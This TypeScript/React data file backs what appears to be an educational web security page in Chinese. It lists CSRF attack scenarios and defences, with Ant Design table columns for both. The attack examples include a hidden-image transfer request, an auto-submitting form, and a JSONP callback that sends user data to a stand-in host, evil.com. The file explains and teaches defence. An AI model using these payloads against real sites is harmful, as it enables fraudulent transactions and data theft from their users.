import React from 'react';
import { Tag, Typography } from 'antd';

// ═══════════════════════ CSRF 攻击场景 ═══════════════════════

export interface CsrfScenario {
  key: string;
  name: string;
  nameEn: string;
  method: 'GET' | 'POST' | '混合';
  severity: '严重' | '高危' | '中危';
  description: string;
  attackExample: string;
  precondition: string;
}

export const csrfScenarios: CsrfScenario[] = [
  {
    key: 'get-csrf',
    name: 'GET 型 CSRF',
    nameEn: 'GET-based CSRF',
    method: 'GET',
    severity: '高危',
    description:
      '将恶意请求参数放在 `<img>`、`<link>`、`<script>` 等标签的 src/href 属性中。浏览器解析这些标签时自动发起 GET 请求并携带目标站点的 Cookie。一行 HTML 即可完成攻击。',
    attackExample:
      '`<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">` — 受害者浏览恶意页面时，浏览器自动向 bank.com 发起转账请求。',
    precondition: '目标站点使用 GET 执行状态变更（转账、删除），且仅依赖 Cookie 认证。',
  },
  {
    key: 'post-csrf',
    name: 'POST 型 CSRF',
    nameEn: 'POST-based CSRF',
    method: 'POST',
    severity: '高危',
    description:
      '构造自动提交的 `<form>` 表单，action 指向目标站点。页面加载时通过 JS 自动提交，浏览器携带目标站点的 Cookie 发送 POST 请求。',
    attackExample:
      '`<form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>`',
    precondition: '目标站点的 POST 接口未校验 CSRF Token 或 Origin 头。',
  },
  {
    key: 'jsonp-hijack',
    name: 'JSONP 劫持',
    nameEn: 'JSONP Hijacking',
    method: 'GET',
    severity: '高危',
    description:
      'JSONP 接口无同源保护。攻击者定义同名回调函数，通过 `<script>` 标签跨域加载接口。攻击者可读取响应中的敏感数据——这是 CSRF + 数据窃取的组合攻击。',
    attackExample:
      '`<script>function getUserData(data) { new Image().src="https://evil.com/steal?data="+JSON.stringify(data); }</script><script src="https://bank.com/api/user?callback=getUserData"></script>`',
    precondition: '目标站点存在返回敏感数据的 JSONP 接口，且未校验 Referer/Origin。',
  },
  {
    key: 'cors-csrf',
    name: 'CORS 配置错误 CSRF',
    nameEn: 'CORS Misconfiguration CSRF',
    method: '混合',
    severity: '严重',
    description:
      'CORS 配置过宽时，恶意页面可跨域发起带 Cookie 的 AJAX 请求并读取响应——比传统 CSRF 更致命，攻击者能拿到请求的返回数据。',
    attackExample:
      '`fetch("https://bank.com/api/user", {credentials:"include"}).then(r=>r.json()).then(data=>/* 发送数据到攻击者服务器 */)` — 若 CORS 配置允许任意 Origin + Credentials。',
    precondition: 'CORS 配置过于宽松：ACAO 通配符或动态反射 + ACAC 为 true 等错误组合。',
  },
  {
    key: 'login-csrf',
    name: '登录 CSRF',
    nameEn: 'Login CSRF',
    method: 'POST',
    severity: '中危',
    description:
      '诱导受害者以攻击者账号登录目标站点。用户后续在站点的所有操作（输入信用卡号、个人信息）都关联到攻击者账号，攻击者可查看。Google 登录页面曾存在此类漏洞。',
    attackExample:
      '自动提交登录表单，填入攻击者的账号密码。用户以为在自己账户中操作，实际数据全存入攻击者账户。',
    precondition: '登录接口未做 CSRF 防护，或登录后未轮换 Session ID。',
  },
  {
    key: 'same-site-bypass',
    name: 'SameSite 绕过',
    nameEn: 'SameSite Cookie Bypass',
    method: 'GET',
    severity: '高危',
    description:
      'SameSite=Lax 在顶级导航 GET 请求中仍携带 Cookie。攻击者可用 `window.open()` 或 `<a>` 标签的 GET 请求绕过 SameSite=Lax。若应用在 GET 中执行状态变更，此防御被绕过。',
    attackExample:
      '攻击者页面中 `<a href="https://bank.com/delete-account" target="_blank">点击领取奖励</a>` — 用户点击，SameSite=Lax 仍携带 Cookie，账户被删除。',
    precondition: '应用在 GET 请求中执行状态变更（违反 RESTful 规范），仅依赖 SameSite=Lax。',
  },
  {
    key: 'flash-csrf',
    name: 'Flash 请求伪造（历史）',
    nameEn: 'Flash-based CSRF (Legacy)',
    method: 'POST',
    severity: '中危',
    description:
      'Flash 可通过 URLRequest API 跨域发送带自定义头的请求，绕过基于 X-Requested-With 的 CSRF 防御。crossdomain.xml 配置不当导致攻击面。Flash 已于 2020 年底停止支持。',
    attackExample:
      '攻击者 .swf 文件中通过 ActionScript 向目标站点发送带自定义 Content-Type 的 POST 请求，绕过仅校验 X-Requested-With 的 CSRF 防御。',
    precondition: 'crossdomain.xml 配置过宽，或仅依赖自定义请求头的 CSRF 防御。',
  },
];

// ═══════════════════════ CSRF 防御方案 ═══════════════════════

export interface CsrfDefense {
  key: string;
  name: string;
  nameEn: string;
  effectiveness: string;
  layer: '浏览器层' | '服务端层' | '框架层' | '架构层';
  principle: string;
  limitation: string;
  applicable: string;
}

export const csrfDefenses: CsrfDefense[] = [
  {
    key: 'synchronizer-token',
    name: 'Synchronizer Token Pattern',
    nameEn: 'Synchronizer Token Pattern',
    effectiveness: '★★★★★',
    layer: '服务端层',
    principle:
      '服务端为每个用户 Session 生成唯一、不可预测的 CSRF Token。Token 嵌入在每个状态变更表单的隐藏字段中。提交时服务端对比表单中的 Token 与 Session 中存储的 Token 是否一致。攻击者无法获取或猜测此 Token，无法构造有效请求。',
    limitation:
      '依赖服务端 Session 存储，不适用于无状态 API（JWT 需额外设计）。每个状态变更表单都需嵌入 Token。Token 不能存 Cookie 中（否则 CSRF 攻击会自动携带）。每次请求或定期轮换 Token 更安全但实现复杂。',
    applicable: '传统 SSR 应用、基于 Session 的认证。',
  },
  {
    key: 'double-submit-cookie',
    name: 'Double Submit Cookie',
    nameEn: 'Double Submit Cookie',
    effectiveness: '★★★★☆',
    layer: '服务端层',
    principle:
      '服务端生成随机 Token，同时设在 Cookie 和请求参数/Header 中。提交时服务端校验 Cookie 中的 Token 与请求中的 Token 一致。攻击者虽可携带 Cookie（浏览器自动），但无法读取或注入 Cookie 值到请求参数中（同源策略），故无法通过校验。',
    limitation:
      '不适用于存在子域接管风险的环境（恶意子域可在子域 Cookie 中写入相同 Token 通过校验）。需确保 Cookie 作用域严格限定。若存在 XSS 则可被读取。',
    applicable: '无状态 API、JWT 认证场景。不需要服务端存储 Token。',
  },
  {
    key: 'samesite-cookie',
    name: 'SameSite Cookie',
    nameEn: 'SameSite Cookie',
    effectiveness: '★★★★☆',
    layer: '浏览器层',
    principle:
      'SameSite=Strict 阻止所有跨站请求携带 Cookie（含链接跳转）。SameSite=Lax（Chrome 默认）在顶级导航 GET 中允许携带 Cookie，但在 POST/iframe/img/ajax 等子资源请求中不携带。浏览器原生防御，无需应用代码改动。',
    limitation:
      'Strict 体验差（外部链接进入登录态丢失）。Lax 不防 GET CSRF 和顶级导航 CSRF。IE 和旧浏览器不完全支持。iframe 嵌入的第三方支付页面需 None。',
    applicable: '所有现代 Web 应用都应配置。是 CSRF 防御的基础（但不应作为唯一防线）。',
  },
  {
    key: 'origin-referer',
    name: 'Origin / Referer 校验',
    nameEn: 'Origin / Referer Validation',
    effectiveness: '★★★☆☆',
    layer: '服务端层',
    principle:
      '服务端校验请求的 Origin 头（协议+域名+端口）或 Referer 头是否属于信任域。跨站 POST/fetch 请求中 Origin 由浏览器自动添加，攻击者无法伪造。',
    limitation:
      'Origin 头部分场景不存在（同源请求、旧浏览器）。Referer Policy 可配置为 no-referrer 导致无法获取。Referer 可能含完整 URL（敏感数据在 query string），有隐私泄露风险。优先使用 Origin。',
    applicable: '辅助防御手段，与 CSRF Token 配合使用。不可作为唯一防线。',
  },
  {
    key: 'custom-header',
    name: '自定义请求头',
    nameEn: 'Custom Request Header',
    effectiveness: '★★★★☆',
    layer: '框架层',
    principle:
      'AJAX 请求可添加自定义请求头（`X-CSRF-Token`、`X-Requested-With: XMLHttpRequest`），浏览器同源策略阻止跨站请求添加自定义头（需 CORS preflight 通过）。攻击者的 `<form>` 或 `<img>` 标签无法添加自定义头。',
    limitation:
      'CORS 配置过宽（允许所有 Origin + 自定义请求头）时攻击者可跨域发起带自定义头的请求。旧版 Flash/Silverlight 可绕过（已废弃）。',
    applicable: 'SPA 中所有 AJAX 请求。与 Double Submit Cookie 配合效果最佳。',
  },
  {
    key: 'captcha-reauth',
    name: '二次验证 / CAPTCHA',
    nameEn: 'Re-authentication / CAPTCHA',
    effectiveness: '★★★★★',
    layer: '架构层',
    principle:
      '对敏感操作（转账、改密、删除账户、绑定新手机）要求用户输入密码、验证码或完成 CAPTCHA。即使 CSRF Token 被绕过，攻击者无法预测或获取用户的密码/验证码。',
    limitation:
      '用户体验差——每次敏感操作需额外验证。不适用于所有操作。CAPTCHA 可能被 AI 绕过（但攻击难度大幅提升）。需在安全性和体验间寻找平衡。',
    applicable: '高敏感操作：支付确认、密码修改、手机号绑定、账户注销。',
  },
  {
    key: 'header-token',
    name: 'Header Token 模式',
    nameEn: 'Header-Based Token Pattern',
    effectiveness: '★★★★☆',
    layer: '框架层',
    principle:
      '将 CSRF Token 存 localStorage（非 Cookie），AJAX 请求通过自定义 Header（`Authorization` 或 `X-CSRF-Token`）发送。攻击者无法读取跨域 localStorage（同源策略），也无法在 form/img 中添加自定义头。',
    limitation:
      'localStorage 中的 Token 可被 XSS 读取。不适合传统 SSR 应用（服务端无法读取浏览器 localStorage）。',
    applicable: '纯 SPA 应用、JWT Token 认证场景。',
  },
];

// ═══════════════════════ 表格列定义 ═══════════════════════

export const scenarioColumns = [
  {
    title: '攻击场景',
    dataIndex: 'name',
    key: 'name',
    width: 160,
    render: (text: string, record: CsrfScenario) => (
      <>
        <Typography.Text strong>{text}</Typography.Text>
        <br />
        <Typography.Text type="secondary" style={{ fontSize: 12 }}>
          {record.nameEn}
        </Typography.Text>
      </>
    ),
  },
  {
    title: '方法',
    dataIndex: 'method',
    key: 'method',
    width: 70,
    render: (m: string) => {
      const colorMap: Record<string, string> = { GET: 'green', POST: 'blue', 混合: 'purple' };
      return <Tag color={colorMap[m]}>{m}</Tag>;
    },
  },
  {
    title: '危害',
    dataIndex: 'severity',
    key: 'severity',
    width: 70,
    render: (s: string) => {
      const m: Record<string, string> = { 严重: 'red', 高危: 'volcano', 中危: 'gold' };
      return <Tag color={m[s]}>{s}</Tag>;
    },
  },
  { title: '攻击方式', dataIndex: 'description', key: 'description', ellipsis: true },
  { title: '前提条件', dataIndex: 'precondition', key: 'precondition', width: 220, ellipsis: true },
];

export const defenseColumns = [
  {
    title: '防御方案',
    dataIndex: 'name',
    key: 'name',
    width: 170,
    render: (text: string, record: CsrfDefense) => (
      <>
        <Typography.Text strong>{text}</Typography.Text>
        <br />
        <Typography.Text type="secondary" style={{ fontSize: 12 }}>
          {record.nameEn}
        </Typography.Text>
      </>
    ),
  },
  {
    title: '层级',
    dataIndex: 'layer',
    key: 'layer',
    width: 80,
    render: (l: string) => <Tag>{l}</Tag>,
  },
  { title: '效果', dataIndex: 'effectiveness', key: 'effectiveness', width: 80 },
  { title: '原理', dataIndex: 'principle', key: 'principle', ellipsis: true },
  { title: '适用场景', dataIndex: 'applicable', key: 'applicable', width: 180, ellipsis: true },
  { title: '局限', dataIndex: 'limitation', key: 'limitation', width: 280, ellipsis: true },
];
